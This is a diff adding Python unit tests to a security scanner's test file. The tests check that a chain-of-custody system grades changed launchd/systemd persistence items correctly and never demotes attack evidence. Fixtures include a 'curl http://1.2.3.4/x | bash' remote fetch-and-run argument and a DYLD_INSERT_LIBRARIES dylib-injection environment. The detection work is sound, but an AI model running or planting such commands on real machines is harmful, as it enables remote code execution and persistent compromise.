@@ -415,3 +415,236 @@ class CustodyGrading(CustodySandbox):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+# --------------------------------------------------------------------------- #
+# Custody for the NON-agent sensors.
+#
+# Motivating failure (2026-08-19, this machine): a scan reported 78 HIGH
+# findings, of which ~60 were one directory migration, nine were Microsoft and
+# Zoom shipping ordinary auto-updates, and the two CRITICAL correlation chains
+# were both a Homebrew Syncthing install. Chain-of-custody existed and answered
+# exactly this question — but only diff_agent_surface() ever called it. Every
+# other sensor scored on code signature plus path writability alone, which on a
+# developer's machine cannot tell a package manager's output from a dropped
+# payload.
+#
+# These tests pin the discriminators AND the three invariants that keep the
+# grading honest: it demotes rather than suppresses, it never raises severity,
+# and attack-defined evidence is never demoted no matter who authored it.
+# --------------------------------------------------------------------------- #
+
+def _prec(program, sha, target=None, target_sha=None, authority=None,
+          trust="developer-id", args=None, env=None, label="com.example.job"):
+    """A persistence record in the shape every platform snapshot produces."""
+    if args is None:
+        args = [program] + ([target] if target else [])
+    return {"label": label, "program": program, "args": args,
+            "args_sha256": aegis.hashlib.sha256(
+                aegis.json.dumps(args, sort_keys=True,
+                                 default=str).encode()).hexdigest(),
+            "sha256": sha, "trust": trust, "run_at_load": True,
+            "authority": authority, "env": env,
+            "script_target": target, "target_sha": target_sha}
+
+
+class PersistenceCustody(unittest.TestCase):
+    """relocated / publisher-stable on a CHANGED persistence item."""
+
+    def _one(self, old, new, path="/Library/LaunchAgents/x.plist"):
+        fs = aegis.check_persistence({path: old}, {path: new})
+        fs = [f for f in fs if f["title"] == "Persistence item CHANGED"]
+        self.assertEqual(len(fs), 1, "expected exactly one CHANGED finding")
+        return fs[0]
+
+    def test_pure_relocation_grades_low(self):
+        """Same interpreter bytes, same payload bytes, new directory."""
+        old = _prec("/bin/bash", "aaa", "/old/dir/run.sh", "pay1", trust="apple")
+        new = _prec("/bin/bash", "aaa", "/new/dir/run.sh", "pay1", trust="apple")
+        f = self._one(old, new)
+        self.assertEqual(f["custody"], "relocated")
+        self.assertEqual(f["severity"], "LOW")
+
+    def test_payload_swap_disguised_as_a_move_is_refused(self):
+        """Same directory move, DIFFERENT payload bytes -> not a relocation."""
+        old = _prec("/bin/bash", "aaa", "/old/dir/run.sh", "pay1", trust="apple")
+        new = _prec("/bin/bash", "aaa", "/new/dir/run.sh", "pay2", trust="apple")
+        f = self._one(old, new)
+        self.assertIsNone(f["custody"])
+        self.assertEqual(f["severity"], "HIGH")
+
+    def test_relocation_is_refused_when_the_baseline_never_hashed_the_payload(self):
+        """A baseline predating payload hashing cannot prove the other half."""
+        old = _prec("/bin/bash", "aaa", "/old/dir/run.sh", None, trust="apple")
+        new = _prec("/bin/bash", "aaa", "/new/dir/run.sh", "pay1", trust="apple")
+        f = self._one(old, new)
+        self.assertIsNone(f["custody"])
+
+    def test_renamed_payload_is_not_a_relocation(self):
+        old = _prec("/bin/bash", "aaa", "/d/run.sh", "pay1", trust="apple")
+        new = _prec("/bin/bash", "aaa", "/d2/other.sh", "pay1", trust="apple")
+        f = self._one(old, new)
+        self.assertIsNone(f["custody"])
+
+    def test_vendor_rebuild_in_place_grades_medium(self):
+        auth = "Developer ID Application: Microsoft Corporation (UBF8T346G9)"
+        old = _prec("/Library/App/updater", "old", authority=auth)
+        new = _prec("/Library/App/updater", "new", authority=auth)
+        f = self._one(old, new)
+        self.assertEqual(f["custody"], "publisher-stable")
+        self.assertEqual(f["severity"], "MEDIUM")
+
+    def test_a_different_signer_is_never_publisher_stable(self):
+        old = _prec("/Library/App/updater", "old",
+                    authority="Developer ID Application: Microsoft Corporation (UBF8T346G9)")
+        new = _prec("/Library/App/updater", "new",
+                    authority="Developer ID Application: Somebody Else (XXXXXXXXXX)")
+        f = self._one(old, new)
+        self.assertIsNone(f["custody"])
+        self.assertEqual(f["severity"], "HIGH")
+
+    def test_unsigned_rebuild_is_never_publisher_stable(self):
+        old = _prec("/Users/u/bin/tool", "old", authority="x", trust="adhoc")
+        new = _prec("/Users/u/bin/tool", "new", authority="x", trust="adhoc")
+        f = self._one(old, new)
+        self.assertIsNone(f["custody"])
+
+
+class PayloadSwapIsVisible(unittest.TestCase):
+    """The blind spot the custody work had to close first.
+
+    A launchd/systemd job is overwhelmingly `<interpreter> <script>`. Hashing
+    only `program` records the interpreter, so rewriting the SCRIPT left every
+    diffed field identical and produced no finding at all."""
+
+    def test_rewriting_the_script_under_a_stable_config_now_fires(self):
+        path = "/Library/LaunchAgents/x.plist"
+        old = _prec("/bin/bash", "aaa", "/d/run.sh", "pay1", trust="apple")
+        new = _prec("/bin/bash", "aaa", "/d/run.sh", "EVIL", trust="apple")
+        fs = [f for f in aegis.check_persistence({path: old}, {path: new})
+              if f["title"] == "Persistence item CHANGED"]
+        self.assertEqual(len(fs), 1, "a rewritten payload must be reported")
+        self.assertEqual(fs[0]["severity"], "HIGH")
+        self.assertIn("payload", fs[0]["detail"])
+
+    def test_a_field_merely_appearing_is_not_a_swap(self):
+        """Upgrading into payload hashing must not alert on every job at once."""
+        path = "/Library/LaunchAgents/x.plist"
+        old = _prec("/bin/bash", "aaa", "/d/run.sh", None, trust="apple")
+        new = _prec("/bin/bash", "aaa", "/d/run.sh", "pay1", trust="apple")
+        fs = [f for f in aegis.check_persistence({path: old}, {path: new})
+              if f["title"] == "Persistence item CHANGED"]
+        self.assertEqual(fs, [])
+
+
+class AttackDefinedIsNeverDemoted(unittest.TestCase):
+    """Knowing who wrote a payload is not a reason to stop calling it one."""
+
+    def test_dylib_injection_survives_a_perfect_relocation(self):
+        path = "/Library/LaunchAgents/x.plist"
+        old = _prec("/bin/bash", "aaa", "/old/run.sh", "pay1", trust="apple")
+        new = _prec("/bin/bash", "aaa", "/new/run.sh", "pay1", trust="apple",
+                    env={"DYLD_INSERT_LIBRARIES": "/tmp/eve.dylib"})
+        fs = [f for f in aegis.check_persistence({path: old}, {path: new})
+              if f["title"] == "Persistence item CHANGED"]
+        self.assertEqual(len(fs), 1)
+        self.assertIsNone(fs[0]["custody"])
+        self.assertIn(fs[0]["severity"], ("HIGH", "CRITICAL"))
+
+    def test_hostile_argv_survives_a_perfect_relocation(self):
+        path = "/Library/LaunchAgents/x.plist"
+        args = ["/bin/bash", "-c", "curl http://1.2.3.4/x | bash"]
+        old = _prec("/bin/bash", "aaa", trust="apple",
+                    args=["/bin/bash", "-c", "echo hi"])
+        new = _prec("/bin/bash", "aaa", trust="apple", args=args)
+        fs = [f for f in aegis.check_persistence({path: old}, {path: new})
+              if f["title"] == "Persistence item CHANGED"]
+        self.assertEqual(len(fs), 1)
+        self.assertIsNone(fs[0]["custody"])
+        self.assertIn(fs[0]["severity"], ("HIGH", "CRITICAL"))
+
+    def test_demote_refuses_when_told_the_evidence_is_attack_defined(self):
+        for rung in aegis._SELF_CUSTODY + aegis._VOUCHED_CUSTODY:
+            self.assertEqual(
+                aegis._demote("HIGH", rung, attack_defined=True), "HIGH", rung)
+
+
+class DemotionLadderInvariants(unittest.TestCase):
+
+    def test_no_rung_ever_raises_severity(self):
+        rungs = (aegis._SELF_CUSTODY + aegis._VOUCHED_CUSTODY
+                 + aegis._WEAK_CUSTODY + ("untracked", "remote-foreign", None,
+                                          "nonsense"))
+        for sev in aegis._SEV_LADDER:
+            for rung in rungs:
+                out = aegis._demote(sev, rung)
+                self.assertLessEqual(aegis.SEV_ORDER[out], aegis.SEV_ORDER[sev],
+                                     "%s + %s raised severity" % (sev, rung))
+
+    def test_foreign_and_untracked_are_never_demoted(self):
+        for rung in ("remote-foreign", "untracked", None):
+            self.assertEqual(aegis._demote("HIGH", rung), "HIGH")
+
+    def test_vouching_rungs_stop_above_low_except_relocation(self):
+        self.assertEqual(aegis._demote("HIGH", "publisher-stable"), "MEDIUM")
+        self.assertEqual(aegis._demote("HIGH", "package-managed"), "MEDIUM")
+        self.assertEqual(aegis._demote("HIGH", "relocated"), "LOW")
+
+    def test_weak_git_rungs_demote_one_step_not_to_low(self):
+        for rung in aegis._WEAK_CUSTODY:
+            self.assertEqual(aegis._demote("HIGH", rung), "MEDIUM", rung)
+
+    def test_strong_self_custody_goes_to_low(self):
+        for rung in aegis._SELF_CUSTODY:
+            self.assertEqual(aegis._demote("HIGH", rung), "LOW", rung)
+
+    def test_every_rung_has_an_explanatory_note(self):
+        for rung in (aegis._SELF_CUSTODY + aegis._VOUCHED_CUSTODY
+                     + aegis._WEAK_CUSTODY):
+            self.assertTrue(aegis._PROVENANCE_NOTE.get(rung), rung)
+
+
+class PackageReceiptsVouchByEvidenceNotByPath(unittest.TestCase):
+    """A path prefix must never be a trust rule: '/opt/homebrew/...' as a rule
+    would vouch for anything dropped into a directory the user can write to,
+    which is exactly the file being graded."""
+
+    def setUp(self):
+        self.tmp = tempfile.mkdtemp(prefix="aegis_receipt_")
+        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
+
+    def test_a_cellar_path_without_a_receipt_does_not_vouch(self):
+        binp = os.path.join(self.tmp, "Cellar", "evil", "1.0", "bin", "evil")
+        os.makedirs(os.path.dirname(binp))
+        with open(binp, "w") as f:
+            f.write("x")
+        self.assertIsNone(aegis._package_receipt(binp))
+
+    def test_a_cellar_path_with_a_receipt_vouches(self):
+        root = os.path.join(self.tmp, "Cellar", "tool", "2.0")
+        binp = os.path.join(root, "bin", "tool")
+        os.makedirs(os.path.dirname(binp))
+        with open(binp, "w") as f:
+            f.write("x")
+        with open(os.path.join(root, "INSTALL_RECEIPT.json"), "w") as f:
+            f.write("{}")
+        self.assertEqual(aegis._package_receipt(binp), "homebrew:tool@2.0")
+
+    def test_an_extension_dir_absent_from_the_index_does_not_vouch(self):
+        ext = os.path.join(self.tmp, ".vscode", "extensions")
+        binp = os.path.join(ext, "evil.pkg-1.0", "bin", "x")
+        os.makedirs(os.path.dirname(binp))
+        with open(binp, "w") as f:
+            f.write("x")
+        with open(os.path.join(ext, "extensions.json"), "w") as f:
+            f.write('[{"identifier":{"id":"good.pkg"}}]')
+        self.assertIsNone(aegis._package_receipt(binp))
+
+    def test_a_missing_file_never_vouches(self):
+        self.assertIsNone(aegis._package_receipt(
+            os.path.join(self.tmp, "Cellar", "x", "1", "bin", "gone")))
+        self.assertIsNone(aegis._package_receipt(None))
+
+    def test_grade_binary_leaves_an_unvouched_binary_alone(self):
+        sev, rung, note = aegis._grade_binary("HIGH", os.path.join(self.tmp, "x"))
+        self.assertEqual((sev, rung, note), ("HIGH", None, None))
